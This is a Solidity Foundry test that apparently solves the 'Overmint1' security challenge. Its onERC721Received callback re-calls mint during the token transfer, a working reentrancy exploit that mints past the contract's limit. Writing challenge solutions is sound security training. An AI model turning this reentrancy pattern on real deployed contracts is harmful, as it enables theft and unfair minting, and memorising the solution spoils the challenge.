// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint1} from "src/Overmint1.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Test is Test, IERC721Receiver {
    Overmint1 public overmint;
    uint8 public minted;

    function setUp() public {
        overmint = new Overmint1();
    }

    function testMint() public {
        minted++;
        overmint.mint();
        assertEq(overmint.success(address(this)), true);
    }

    function onERC721Received(
        address, /* operator */
        address, /* from */
        uint256, /* tokenId */
        bytes calldata /* data */
    ) external override returns (bytes4) {
        if (minted < 5) {
            testMint();
        }

        return this.onERC721Received.selector;
    }
}
